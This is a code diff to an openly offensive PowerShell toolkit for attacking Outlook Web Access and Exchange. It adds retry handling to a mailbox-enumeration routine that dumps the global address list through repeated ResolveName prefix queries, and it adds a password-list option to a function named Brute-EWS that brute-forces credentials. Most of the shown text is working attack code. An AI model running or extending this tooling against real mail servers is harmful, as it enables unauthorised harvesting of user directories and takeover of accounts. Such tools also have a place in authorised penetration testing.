@@ -1,4 +1,4 @@
-# Toolkit for attacking exchange
+# Toolkit for attacking OWA
 # author @slobtresix0, @curi0usJack
 
 function Write-Message($message, $type)
@@ -348,12 +348,22 @@ $GAL_Full = @()
 foreach ($layer1 in $alphaList)
 {
 
-    write-host "Making request for " $layer1
+    write-host "Making request for layer 1 " $layer1
     if($layer1 -eq "s") 
     {
     continue #everyrequest has SMTP in the response and it messes everything up
     }
-    $response = $exchService.ResolveName($layer1)
+    
+    try
+    {
+        $response = $exchService.ResolveName($layer1)
+    }
+    catch
+    {
+        write-host "Request Failed"
+        Start-Sleep -s 10
+        continue
+    }
     if ($response.Count -ge 100)
     {
 
@@ -364,22 +374,40 @@ foreach ($layer1 in $alphaList)
             
             $layer2 = $layer1 + $alphaList[$i]
             
-            write-host "Making request for " $layer2
+            write-host "Making request for layer 2 " $layer2
 
-            $response = $exchService.ResolveName($layer2)
+            try 
+            {
+                $response = $exchService.ResolveName($layer2)
+            }
+            catch
+            {
+                write-host "Request Failed"
+                Start-Sleep -s 10
+                continue
+            }
             if ($response.Count -ge 100)
             {
 
-                write-host "Response is greater than 100, adding char to request"
+                write-host "Response is greater than 100, adding char to request again"
 
-                for ($i = 0; $i -lt $alphaList1.length; $i++)
+                for ($i = 0; $i -lt $alphaList.length; $i++)
                 {
             
                     $layer3 = $layer2 + $alphaList[$i]
             
-                    write-host "Making request for " $layer3
+                    write-host "Making request for layer 3 " $layer3
 
-                    $response = $exchService.ResolveName($layer3)
+                    try
+                    {
+                        $response = $exchService.ResolveName($layer3)
+                    }
+                    catch
+                    {
+                        write-host "Request Failed"
+                        Start-Sleep -s 10
+                        continue
+                    }
                     foreach ($mailbox in $response)
                     {
 
@@ -703,9 +731,14 @@ function Brute-EWS
 	  [string]$Domain,
 
       [Parameter(Mandatory=$false)]
-	  [string]$UserAsPass
+	  [string]$UserAsPass,
+
+      [Parameter(Mandatory=$false)]
+	  [string]$PasswordList
 
 	)
+
+$PasswordList = gc -Path $PasswordList
 
 $Brute = $True
 $cmdPath = $env:temp + "\OTK-Init.ps1" 
